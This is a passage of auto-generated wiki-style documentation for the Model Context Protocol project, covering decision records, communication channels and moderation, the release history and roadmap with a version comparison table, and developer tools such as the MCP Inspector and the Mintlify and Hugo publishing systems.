[Why this decision was needed, what problem it solves]

**Options Considered:**
1. Option A: [Description + pros/cons]
2. Option B: [Description + pros/cons]
3. Option C: [Description + pros/cons]

**Chosen Approach:** Option B

**Rationale:**
[Why Option B was selected over alternatives]

**Implementation Steps:**
1. [Concrete action items]
2. [With responsible parties]
3. [And timelines]

**Related Links:**
- SEP: #[number]
- Discussion: [link]
- Implementation PR: #[number]
```

### Decision Flow

```mermaid
graph LR
    Discussion["Discussion Phase<br/>Discord + GitHub Discussions<br/>Explore options"]
    
    Proposal["Proposal Phase<br/>GitHub Issue or SEP<br/>Structured document"]
    
    Decision["Decision Phase<br/>Core Maintainer review<br/>Documented rationale"]
    
    Implementation["Implementation Phase<br/>Pull requests<br/>Reference code"]
    
    Record["Decision Record<br/>GitHub Issues: notes label<br/>SEPs: Final status<br/>Changelog: version entry"]
    
    Discussion --> Proposal
    Proposal --> Decision
    Decision --> Implementation
    Implementation --> Record
    
    Decision -.documents.-> Record
```

### Accessing Decision Records

**Technical Decisions:**
```
https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=label:notes
```

**Specification Changes:**
```
https://github.com/modelcontextprotocol/specification/tree/main/seps
https://modelcontextprotocol.io/specification/draft/changelog
```

**Process/Governance:**
```
https://modelcontextprotocol.io/community/governance
https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=label:governance
```

**Sources:** [docs/community/communication.mdx:89-105](), [docs/community/governance.mdx:81-82]()

## Code of Conduct and Moderation

All communication across all channels is governed by the project's Code of Conduct:

**Location:** [CODE_OF_CONDUCT.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/CODE_OF_CONDUCT.md)

**Expectations:**
- Respectful, professional, and inclusive interactions
- Vendor-neutral discussions (avoid marketing/sales)
- Focus on specification development, not product support
- No general MCP support questions in contributor Discord

**Moderation Team:** See [Community Moderators](#7.2) in the maintainers directory. As of October 2025, community moderators include:
- Ola Hungerford (@olaservo)
- Cliff Hall (@cliffhall)
- Shaun Smith (@evalstate)
- Jonathan Hefner (@jonathanhefner)
- Tadas Antanavicius (@tadasant)

**Sources:** [docs/community/communication.mdx:17-18](), [MAINTAINERS.md:113-120](), [docs/community/communication.mdx:37-39]()

## Meeting Calendar and Coordination

### Public Meeting Calendar

All Working Group and Interest Group meetings are published at `meet.modelcontextprotocol.io`. WG/IG facilitators are responsible for:

1. Publishing meeting schedules in advance
2. Tagging meetings with topic and channel name (e.g., `auth-ig`, `agents-wg`)
3. Posting meeting notes as GitHub Issues or public Google Docs
4. Linking notes in respective Discord channels

### Core Maintainer Meetings

Core Maintainers meet bi-weekly to discuss proposals and project direction. Notes on proposals are made public via GitHub Issues with the `notes` label. The group strives to meet in person every 3-6 months.

**Sources:** [docs/community/working-interest-groups.mdx:24-30](), [docs/community/governance.mdx:127-129]()

## Channel Selection Guide

### Decision Tree for Channel Selection

```mermaid
graph TD
    Start["Need to communicate<br/>about MCP?"]
    
    SecurityQ{"Security<br/>vulnerability?"}
    ActionableQ{"Actionable bug<br/>or task?"}
    LongFormQ{"Needs long-form<br/>discussion?"}
    SpecChangeQ{"Proposes spec<br/>change?"}
    QuickQ{"Quick question<br/>or brainstorm?"}
    
    Start --> SecurityQ
    SecurityQ -->|Yes| SecReport["Use SECURITY.md<br/>Private reporting"]
    SecurityQ -->|No| ActionableQ
    
    ActionableQ -->|Yes| GHIssue["Create GitHub Issue<br/>With reproduction steps"]
    ActionableQ -->|No| LongFormQ
    
    LongFormQ -->|Yes| SpecChangeQ
    LongFormQ -->|No| QuickQ
    
    SpecChangeQ -->|Yes| SEP["Create SEP PR<br/>seps/0000-feature.md"]
    SpecChangeQ -->|No| GHDiscussion["Create GitHub Discussion<br/>Gather feedback"]
    
    QuickQ -->|Yes| Discord["Post in Discord<br/>Relevant channel"]
    QuickQ -->|No| GHDiscussion
    
    Discord -.leads to decision.-> GHDiscussion
    GHDiscussion -.matures into.-> SEP
    
    style SecReport fill:#ffe0e0
```

**Sources:** [docs/community/communication.mdx:8-88]()

## Anti-Patterns to Avoid

### Common Communication Mistakes

| Anti-Pattern | Why It's Wrong | Correct Approach |
|--------------|----------------|------------------|
| Posting SEPs as Issues | SEPs require PR-based workflow since Nov 2025 | Create PR to `seps/` directory |
| Discussing decisions only in Discord | Discord is transient, not searchable | Move to GitHub Discussion/Issue |
| Public security bug reports | Exposes users to risk | Use SECURITY.md private reporting |
| Marketing products in Discord | Contributor Discord is vendor-neutral | Focus on specification, not sales |
| Asking general MCP support questions | Discord is for contributors, not users | Read documentation, use product support |
| Private technical discussions | Violates transparency requirement | Use public channels + document decisions |

**Sources:** [docs/community/communication.mdx:37-53](), [blog/content/posts/2025-11-28-sep-process-update.md:1-68]()

---

# Page: Release History and Roadmap

# Release History and Roadmap

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/specification/2025-06-18/basic/index.mdx](docs/specification/2025-06-18/basic/index.mdx)
- [docs/specification/2025-06-18/basic/transports.mdx](docs/specification/2025-06-18/basic/transports.mdx)
- [docs/specification/2025-06-18/basic/utilities/cancellation.mdx](docs/specification/2025-06-18/basic/utilities/cancellation.mdx)
- [docs/specification/2025-06-18/basic/utilities/ping.mdx](docs/specification/2025-06-18/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/transports.mdx](docs/specification/draft/basic/transports.mdx)
- [docs/specification/draft/basic/utilities/cancellation.mdx](docs/specification/draft/basic/utilities/cancellation.mdx)
- [docs/specification/draft/basic/utilities/ping.mdx](docs/specification/draft/basic/utilities/ping.mdx)
- [docs/specification/draft/changelog.mdx](docs/specification/draft/changelog.mdx)

</details>



This document chronicles the evolution of the Model Context Protocol through its major releases, documenting the key features and Specification Enhancement Proposals (SEPs) introduced in each version. It also outlines the protocol's versioning scheme, release cadence, and future roadmap.

For information about the governance structure that oversees these releases, see [Governance Structure](#7.1). For details on the SEP process itself, see [Specification Enhancement Process](#6.2).

## Versioning Scheme

MCP uses a **date-based versioning scheme** in YYYY-MM-DD format. Each version identifier represents the date of the last breaking change to the protocol, not necessarily the date of every modification. This scheme ensures:

- Clear chronological ordering of protocol versions
- Explicit indication of compatibility boundaries
- Predictable version negotiation during the [initialization phase](#2.4)

The versioning scheme distinguishes between:
- **Legacy versions** (2024-11-05 through 2025-06-18): Use JSON Schema draft-07
- **Modern versions** (2025-11-25 onward): Use JSON Schema 2020-12 with updated terminology

The special version identifier `draft` represents active development and may change without notice.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:1-272](), [docs/specification/draft/changelog.mdx:1-34]()

## Release Cadence

MCP follows a **quarterly release cadence**, delivering major protocol updates approximately every three months. This rhythm balances the need for protocol stability with the pace of innovation in the ecosystem.

```mermaid
gantt
    title MCP Release Timeline
    dateFormat YYYY-MM-DD
    section Releases
    "2024-11-05 (Genesis)"     :milestone, 2024-11-05, 0d
    "2025-03-26"               :milestone, 2025-03-26, 0d
    "2025-06-18"               :milestone, 2025-06-18, 0d
    "2025-11-25 (1yr)"         :milestone, 2025-11-25, 0d
    "draft"                    :active, 2025-11-26, 30d
    section Community Growth
    "Registry Launch"          :crit, 2024-09-08, 1d
    "2,900+ Discord Members"   :2025-11-01, 24d
    "~2,000 Servers (407% growth)" :2024-09-08, 78d
```

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28-129]()

## Release History Overview

| Version | Release Date | Major Features | Breaking Changes | Notable SEPs |
|---------|-------------|----------------|------------------|--------------|
| **2024-11-05** | November 5, 2024 | Initial protocol release, stdio and HTTP+SSE transports, basic tools/resources/prompts | N/A (Genesis) | N/A |
| **2025-03-26** | March 26, 2025 | Stability improvements, ecosystem growth | Minor refinements | Various |
| **2025-06-18** | June 18, 2025 | Streamable HTTP transport, improved session management | Replaced HTTP+SSE with Streamable HTTP | Transport redesign |
| **2025-11-25** | November 25, 2025 | Tasks, simplified auth, sampling with tools, extensions | JSON Schema 2020-12 migration | SEP-1686, SEP-991, SEP-1577 |
| **draft** | Active Development | PR-based SEP workflow, ongoing refinements | TBD | SEP-1850 |

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-272](), [docs/specification/draft/changelog.mdx:1-34]()

## Version 2024-11-05 (Genesis Release)

**Release Date:** November 5, 2024

The genesis release of MCP established the foundational protocol architecture. Announced in [Anthropic's original blog post](https://www.anthropic.com/news/model-context-protocol), this version introduced:

### Core Architecture
- **JSON-RPC 2.0 foundation**: Request/response/notification message types
- **stdio transport**: Local subprocess communication via stdin/stdout
- **HTTP+SSE transport**: Remote server support with Server-Sent Events
- **Initialization lifecycle**: `initialize` request, capability negotiation, `initialized` notification

### Server Features
- **Tools**: Executable functions with JSON Schema input/output definitions
- **Resources**: Contextual data with URI templates and subscriptions
- **Prompts**: Structured message templates with arguments

### Client Features
- **Sampling**: LLM completion requests (without tool support initially)
- **Logging**: Structured log message delivery from servers

### Versioning
- Protocol version negotiation during initialization
- JSON Schema draft-07 for message validation

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:10-18]()

## Version 2025-03-26

**Release Date:** March 26, 2025

This release focused on stability improvements and ecosystem consolidation as adoption accelerated. While specific SEPs are not individually documented for this version, the focus was on:

- Refinements to existing features based on early production deployments
- Clarifications in specification language
- Minor bug fixes and edge case handling
- Continued support for growing server ecosystem

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28-29]()

## Version 2025-06-18

**Release Date:** June 18, 2025

This release introduced a major transport layer redesign, replacing the deprecated HTTP+SSE transport with the more flexible Streamable HTTP transport.

### Major Changes

#### Streamable HTTP Transport
Replaced the separate SSE and POST endpoints of the HTTP+SSE transport with a unified **MCP endpoint** supporting both POST and GET methods:

- **Single endpoint**: Both POST (client-to-server) and GET (server-to-client) on same URL
- **Optional SSE streaming**: Servers can stream multiple messages or return single JSON responses
- **Session management**: `MCP-Session-Id` header for stateful connections
- **Resumability**: Event IDs enable stream resumption after disconnections
- **Server-initiated closure**: Servers can close connections with `retry` field for client polling
- **Protocol version header**: `MCP-Protocol-Version` header on all requests

The transport supports multiple concurrent streams and provides improved connection management.

#### Security Enhancements
- **Origin validation**: MUST validate `Origin` header to prevent DNS rebinding attacks
- **Localhost binding**: SHOULD bind to 127.0.0.1 for local servers
- **Proper authentication**: SHOULD implement authentication for all connections

### Backwards Compatibility
Servers can maintain both old HTTP+SSE endpoints and new Streamable HTTP endpoint. Clients can probe with POST to `InitializeRequest` and fall back to GET for old-style servers.

**Sources:** [docs/specification/2025-06-18/basic/transports.mdx:1-323](), [docs/specification/draft/basic/transports.mdx:54-63]()

## Version 2025-11-25 (First Anniversary Release)

**Release Date:** November 25, 2025

The one-year anniversary release delivered major enhancements across task management, authorization, and agentic capabilities. This version marked the transition to JSON Schema 2020-12 and introduced the extensions framework.

```mermaid
graph TB
    subgraph "Core Protocol Enhancements"
        Tasks["SEP-1686: Task System<br/>Async Operations"]
        Sampling["SEP-1577: Sampling with Tools<br/>Agentic Servers"]
        DevEx["Developer Experience<br/>SEP-986, SEP-1319, SEP-1699, SEP-1309"]
    end
    
    subgraph "Authorization & Security"
        CIMD["SEP-991: Client ID Metadata<br/>URL-based Registration"]
        Security["SEP-1024: Local Server Security<br/>SEP-835: Default Scopes"]
        AuthExt["Authorization Extensions<br/>SEP-1046: Client Credentials<br/>SEP-990: Cross App Access"]
    end
    
    subgraph "Extensions Framework"
        ExtConcept["Extensions Introduction<br/>Optional, Additive, Composable"]
        URLMode["SEP-1036: URL Mode Elicitation<br/>Secure Credentials"]
    end
    
    subgraph "Schema Migration"
        JSONSchema["JSON Schema 2020-12<br/>$defs instead of definitions"]
    end
    
    Tasks --> DevEx
    Sampling --> DevEx
    CIMD --> AuthExt
    Security --> AuthExt
    ExtConcept --> URLMode
    ExtConcept --> AuthExt
```

### Task-Based Workflows (SEP-1686)

Introduced a new abstraction for tracking long-running server operations. Tasks are **experimental** in this release to allow real-world validation.

**Task States:**
- `working`: Operation in progress
- `input_required`: Needs user/client input
- `completed`: Successfully finished
- `failed`: Operation failed
- `cancelled`: Explicitly cancelled

**Capabilities:**
- **Active polling**: Clients query task status via `tasks/get`
- **Result retrieval**: Access completed task results after request completion
- **Lifecycle management**: Cancel operations via `tasks/cancel` request
- **Session isolation**: Security boundaries with session-based access control

**Use Cases:**
- Healthcare data analysis processing hundreds of thousands of data points
- Enterprise automation with multi-step workflows
- Long-running code migration tools
- Test execution platforms with streaming logs
- Deep research tools spawning multiple agents
- Multi-agent concurrent systems

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:134-159]()

### Simplified Authorization (SEP-991)

Replaced the complex Dynamic Client Registration (DCR) requirement with **Client ID Metadata Documents**, a URL-based registration approach from the [OAuth Client ID Metadata Documents draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00).

**Problem Solved:**
In MCP's unbounded client-server ecosystem, pre-registration is impractical and DCR adds significant complexity requiring authorization server support or custom OAuth proxies.

**Solution:**
Clients provide a URL as their client ID, pointing to a JSON document describing client properties. This enables:
- Self-describing clients without registration flows
- No authorization server DCR support required
- Simplified deployment for both clients and servers
- Backward compatibility with existing systems

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:160-171]()

### Security and Enterprise Features

#### SEP-1024: Client Security Requirements
Defines security requirements for clients when installing local MCP servers, addressing local server compromise scenarios.

#### SEP-835: Default Scopes
Establishes default scope definitions in the authorization specification, providing standard permission sets.

#### Authorization Extensions
Introduced two new authorization extensions under the broader extensions framework:

**SEP-1046: OAuth Client Credentials**
Supports machine-to-machine authorization flows using OAuth 2.0 client credentials grant.

**SEP-990: Enterprise IdP Policy Controls (Cross App Access)**
Enables single sign-on within enterprises—users authenticate to the MCP client once and gain access to all authorized servers without additional prompts.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:172-210]()

### URL Mode Elicitation (SEP-1036)

Addresses secure credential collection by allowing servers to redirect users to browser-based OAuth flows instead of handling credentials directly in the client.

**Use Cases:**
- Secure API key and password collection (credentials never transit MCP client)
- External OAuth flows (servers obtain third-party authorization without token passthrough)
- PCI-compliant payment processing

**Flow:**
1. Server sends URL via elicitation request
2. Client provides affordance for user to open URL
3. User completes flow in browser
4. Server receives tokens directly from authorization endpoint
5. No credentials pass through MCP client

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:211-226]()

### Sampling with Tools (SEP-1577)

Extended the sampling capability to support tool calling, enabling servers to implement agentic loops using the client's LLM capabilities.

**New Capabilities:**
- **Tool definitions in sampling requests**: Servers include tool schemas
- **Tool choice behavior**: Specify required, auto, or no tool usage
- **Server-side agent loops**: Sophisticated multi-step reasoning
- **Parallel tool calls**: Concurrent tool execution support
- **Context control**: Deprecating ambiguous `includeContext` parameter in favor of explicit capability declarations

**Example Use Case:**
A research server spawns multiple internal agents, coordinates their work, and delivers coherent results using only standard MCP primitives—no custom scaffolding needed.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:227-241]()

### Extensions Framework

Introduces **extensions** as components operating outside the core specification, providing a flexible mechanism for specialized capabilities without requiring full protocol integration.

**Extension Properties:**
- **Optional**: Implementors choose whether to adopt
- **Additive**: Do not modify or break core protocol functionality
- **Composable**: Multiple extensions can coexist without conflicts
- **Independently versioned**: Follow core MCP versioning cycle but may adopt independent versioning

Examples:
- [MCP Apps Extension](https://blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps/)
- Authorization extensions (Client Credentials, Cross App Access)
- URL Mode Elicitation

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:185-210]()

### Developer Experience Improvements

#### SEP-986: Standardized Tool Names
Defines standardized format for tool naming conventions.

#### SEP-1319: Decoupled Request Payload
Decouples request payload definitions from RPC method definitions for cleaner schema organization.

#### SEP-1699: SSE Polling via Server-Side Disconnect
Improves Streamable HTTP connection management by allowing servers to explicitly close connections with retry hints.

#### SEP-1309: Improved Specification Version Management
Enhances SDK version management to better track protocol versions.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:242-250]()

### JSON Schema Migration

Transitioned from JSON Schema draft-07 to **JSON Schema 2020-12**, adopting updated terminology:
- `$defs` instead of `definitions`
- Updated meta-schema references
- Improved schema composition

Legacy versions (2024-11-05 through 2025-06-18) remain on draft-07 for backward compatibility.

**Sources:** [docs/specification/draft/changelog.mdx:1-34]()

## Current Development (draft)

The `draft` version represents active protocol development and contains changes not yet frozen in a dated release.

### SEP-1850: PR-Based SEP Workflow

Formalizes a new SEP process using GitHub Pull Requests:
- **Markdown files**: SEPs stored in `seps/` directory
- **PR-derived numbering**: SEP numbers automatically assigned from PR numbers
- **Sponsor responsibilities**: Clear sponsor role from steering group
- **Status management**: PR labels track SEP states (draft, in-review, accepted, final)

This replaces the previous issue-based SEP workflow with a more structured, code-review-style process.

**Sources:** [docs/specification/draft/changelog.mdx:28-29]()

### Utility Protocol Enhancements

Recent additions to protocol utilities:

#### Cancellation
Optional cancellation of in-progress requests via `notifications/cancelled`. For task-augmented requests, use `tasks/cancel` instead.

#### Ping
Lightweight keep-alive mechanism allowing either party to verify connection health with empty `ping` request and response.

**Sources:** [docs/specification/draft/basic/utilities/cancellation.mdx:1-87](), [docs/specification/draft/basic/utilities/ping.mdx:1-69]()

## Future Roadmap

The protocol's evolution priorities for upcoming releases focus on production readiness and ecosystem maturity.

### Reliability and Observability
- Enhanced debugging capabilities for complex MCP deployments
- Standardized monitoring and metrics collection
- Better error reporting and diagnostics
- Connection health tracking

### Server Composition
- Patterns for combining multiple servers
- Server-to-server communication primitives
- Delegation and proxying mechanisms
- Composite capability advertisement

### Security Model Refinement
- Expanded enterprise security controls
- Additional authorization extension patterns
- Improved scope management
- Enhanced audit logging

### Community-Driven Features
The roadmap emphasizes that future evolution will be shaped by:
- Production deployment feedback
- Real-world use case analysis
- Community-submitted SEPs
- SDK developer input
- Client and server implementer needs

The protocol aims to remain **stable, secure, and simple** while scaling to meet enterprise requirements.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:251-264]()

## Release Metrics and Adoption

The following metrics demonstrate the protocol's trajectory:

```mermaid
graph LR
    subgraph "Ecosystem Growth (Sept 2024 - Nov 2025)"
        Registry["MCP Registry<br/>~2,000 servers<br/>407% growth"]
        Discord["Discord Community<br/>2,900+ members<br/>100+ new weekly"]
        Clients["Client Implementations<br/>96+ documented"]
        Maintainers["Governance<br/>58 maintainers<br/>9 core<br/>2 leads"]
    end
    
    subgraph "Production Adoption"
        Official["Official Servers<br/>Notion, Stripe, GitHub<br/>Hugging Face, Postman"]
        Platforms["Platform Integration<br/>ChatGPT, Claude Desktop<br/>VS Code, Replit"]
        Enterprise["Enterprise Users<br/>Block, Microsoft<br/>AWS, Google Cloud"]
    end
    
    Registry --> Official
    Discord --> Maintainers
    Clients --> Platforms
    Official --> Enterprise
```

**Key Milestones:**
- **2,900+ Discord members** with 100+ joining weekly
- **~2,000 servers** in registry (407% growth since September 2024)
- **96+ client implementations** with varying feature support
- **58 maintainers** including 9 core and 2 lead maintainers
- **17 SEPs** processed in approximately one quarter's time

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28-127]()

## Version Comparison Matrix

| Feature | 2024-11-05 | 2025-03-26 | 2025-06-18 | 2025-11-25 | draft |
|---------|------------|------------|------------|------------|-------|
| **stdio Transport** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **HTTP+SSE Transport** | ✓ | ✓ | Deprecated | Removed | Removed |
| **Streamable HTTP Transport** | ✗ | ✗ | ✓ | ✓ | ✓ |
| **JSON Schema Version** | draft-07 | draft-07 | draft-07 | 2020-12 | 2020-12 |
| **Tools** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Resources** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Prompts** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Sampling (basic)** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Sampling with Tools** | ✗ | ✗ | ✗ | ✓ | ✓ |
| **Tasks** | ✗ | ✗ | ✗ | ✓ (Experimental) | ✓ (Experimental) |
| **Client ID Metadata Documents** | ✗ | ✗ | ✗ | ✓ | ✓ |
| **Extensions Framework** | ✗ | ✗ | ✗ | ✓ | ✓ |
| **URL Mode Elicitation** | ✗ | ✗ | ✗ | ✓ | ✓ |
| **Cancellation** | Basic | Basic | Basic | Enhanced | Enhanced |
| **Ping** | ✗ | ✗ | ✓ | ✓ | ✓ |
| **SEP Process** | Issue-based | Issue-based | Issue-based | Issue-based | PR-based (SEP-1850) |

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-272](), [docs/specification/draft/changelog.mdx:1-34]()

---

# Page: Tools and Debugging

# Tools and Utilities

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



This document provides an overview of the developer tools that support Model Context Protocol development, testing, and documentation. The MCP ecosystem includes two primary categories of tools: the **MCP Inspector** for interactive server testing and debugging, and the **Documentation/Blog Systems** for publishing protocol specifications and community updates.

For detailed information about contributing to the MCP specification itself, see [Development Guide](#6). For information about building MCP servers and clients, see [Server Development](#5) and [Client Ecosystem](#4).

## Overview

The MCP tooling ecosystem serves two distinct purposes:

1. **Development and Testing Tools**: The MCP Inspector enables interactive testing of MCP servers during development, providing real-time feedback on server capabilities, tool execution, resource access, and protocol compliance.

2. **Documentation and Publishing Infrastructure**: A dual-platform publishing system maintains technical documentation (via Mintlify) and community announcements (via Hugo blog), with automated generation pipelines that keep documentation synchronized with the canonical TypeScript schema definitions.

These tools are documented in detail in subsections:
- [MCP Inspector](#8.1) - Interactive server testing tool
- [Documentation and Blog Systems](#8.2) - Publishing infrastructure

## MCP Inspector

The MCP Inspector is a command-line tool that provides an interactive web interface for testing MCP servers. It acts as a lightweight MCP client, allowing developers to exercise server capabilities without integrating with a full-featured client application.

### Purpose and Use Cases

The Inspector serves as the primary development tool for:
- **Initial server development**: Testing basic connectivity and capability negotiation
- **Feature verification**: Validating that tools, resources, and prompts work as expected
- **Debugging**: Inspecting request/response payloads and monitoring server notifications
- **Integration testing**: Verifying server behavior before deploying to production clients

### Execution Model

The Inspector is distributed as an npm package `@modelcontextprotocol/inspector` and runs via `npx` without requiring installation:

```bash
npx @modelcontextprotocol/inspector <command> <args>
```

It supports two primary execution modes:
1. **Package execution**: Testing published npm or PyPI packages using `npx` or `uvx` commands
2. **Local development**: Testing local servers using `node` or `uv` commands

The Inspector launches the specified server as a subprocess using the stdio transport and provides a web interface (typically on `http://localhost:5173`) for interaction.

Sources: [docs/docs/tools/inspector.mdx:1-76]()

### Interface Components

```mermaid
graph TB
    subgraph Inspector["MCP Inspector Web Interface"]
        ServerPane["Server Connection Pane<br/>Transport Selection<br/>Command & Environment Config"]
        ResourcesTab["Resources Tab<br/>List, Metadata, Content<br/>Subscription Testing"]
        PromptsTab["Prompts Tab<br/>Templates, Arguments<br/>Message Preview"]
        ToolsTab["Tools Tab<br/>Schemas, Descriptions<br/>Execution Testing"]
        NotificationsPane["Notifications Pane<br/>Server Logs<br/>Protocol Notifications"]
    end
    
    subgraph ServerProcess["MCP Server Process"]
        Server["Server Implementation"]
        Capabilities["Tools, Resources, Prompts"]
    end
    
    ServerPane -->|"stdio transport"| Server
    ResourcesTab -->|"resources/list"| Server
    ResourcesTab -->|"resources/read"| Server
    PromptsTab -->|"prompts/list"| Server
    PromptsTab -->|"prompts/get"| Server
    ToolsTab -->|"tools/list"| Server
    ToolsTab -->|"tools/call"| Server
    Server -->|"notifications"| NotificationsPane
    Server -->|"logging messages"| NotificationsPane
```

**Inspector Interface Architecture**

The Inspector provides five primary interface components that map directly to MCP protocol features:

1. **Server Connection Pane**: Configures transport, command-line arguments, and environment variables for server launch
2. **Resources Tab**: Tests `resources/list` and `resources/read` endpoints, displays MIME types and resource content
3. **Prompts Tab**: Tests `prompts/list` and `prompts/get` endpoints, allows argument customization
4. **Tools Tab**: Tests `tools/list` and `tools/call` endpoints, validates input schemas and execution results
5. **Notifications Pane**: Displays server logs and protocol notifications in real-time

Sources: [docs/docs/tools/inspector.mdx:78-115]()

### Integration with Development Workflow

The Inspector is typically used in iterative development cycles:

1. Make changes to server code
2. Rebuild the server (if necessary)
3. Launch Inspector with the server
4. Test affected features through the web interface
5. Monitor notifications and logs for errors
6. Repeat

For debugging more complex integration issues, developers use the Inspector in combination with Claude Desktop logging and Chrome DevTools, as documented in the debugging guide.

Sources: [docs/docs/tools/inspector.mdx:117-138](), [docs/legacy/tools/debugging.mdx:1-295]()

## Documentation and Publishing Systems

The MCP repository maintains two separate publishing systems that serve distinct audiences and content types:

### Mintlify Documentation Platform

Mintlify serves the main technical documentation at `modelcontextprotocol.io`, including:
- Protocol specifications across multiple versions
- Developer guides and tutorials
- SDK documentation
- Client and server examples

The platform is configured via `docs.json`, which defines navigation structure, versioning, redirects, and styling.

```mermaid
graph LR
    subgraph MintlifyConfig["docs.json Configuration"]
        Navigation["navigation.tabs[]<br/>Documentation, Specification, Community"]
        Versions["versions[]<br/>2025-11-25, 2025-06-18, draft"]
        Redirects["redirects[]<br/>/specification/latest → 2025-11-25"]
        Styling["theme: mint<br/>colors, logo, favicon"]
    end
    
    subgraph ContentFiles["Content Sources"]
        MDXDocs["docs/**/*.mdx<br/>Hand-written Documentation"]
        SchemaMDX["docs/specification/*/schema.mdx<br/>Generated API Reference"]
        CustomCSS["docs/style.css<br/>Custom Styling"]
    end
    
    subgraph MintlifySite["modelcontextprotocol.io"]
        DocPages["Documentation Pages"]
        SpecPages["Specification Pages<br/>Multi-version"]
        CommunityPages["Community & Governance"]
    end
    
    Navigation --> DocPages
    Versions --> SpecPages
    MDXDocs --> DocPages
    SchemaMDX --> SpecPages
    CustomCSS --> MintlifySite
    Redirects --> MintlifySite
```

**Mintlify Configuration and Content Flow**

Sources: [docs/docs.json:1-462]()

### Hugo Blog Platform

Hugo serves the blog at `blog.modelcontextprotocol.io` using the PaperMod theme. The blog publishes:
- Release announcements
- Protocol evolution updates
- Community spotlights
- Implementation showcases

Configuration is managed via `hugo.toml`:

| Configuration Key | Purpose | Value/Notes |
|------------------|---------|-------------|
| `baseURL` | Site URL | `https://blog.modelcontextprotocol.io/` |
| `theme` | Hugo theme | `github.com/adityatelange/hugo-PaperMod` |
| `pagination.pagerSize` | Posts per page | 5 |
| `params.ShowReadingTime` | Display read time | `true` |
| `params.ShowCodeCopyButtons` | Code block copying | `true` |
| `params.ShowFullTextinRSS` | RSS feed content | `true` (full text) |
| `markup.highlight.style` | Syntax theme | `monokai` |

The blog includes navigation links to the main documentation site and GitHub repository, creating a cohesive web presence.

Sources: [blog/hugo.toml:1-71]()

### Custom Styling System

The documentation platform uses a custom CSS file that provides:

1. **Schema Reference Styling**: Custom rendering for TypeDoc-generated schema documentation, including syntax highlighting for TypeScript types and interfaces
2. **Feature Matrix Tables**: Specialized styling for the client feature support matrix with fixed-width layout
3. **Section Numbering**: Automatic hierarchical section numbering for headings (enabled by `#enable-section-numbers` element)

Key styling patterns:

```mermaid
graph TB
    subgraph CSSModules["docs/style.css Modules"]
        FontMono["--font-mono Variable<br/>JetBrains Mono fallback chain"]
        FeatureMatrix["#feature-support-matrix-wrapper<br/>Fixed width table, centered cells"]
        SectionNumbers["body:has(#enable-section-numbers)<br/>Counter-based heading numbering"]
        SchemaRef["body:has(#schema-reference)<br/>TypeDoc signature styling"]
    end
    
    subgraph Selectors["CSS Selectors"]
        H5H6["h5, h6 weight adjustments"]
        TSDSignature[".tsd-signature<br/>Code block styling"]
        TSDMember[".tsd-member<br/>API member display"]
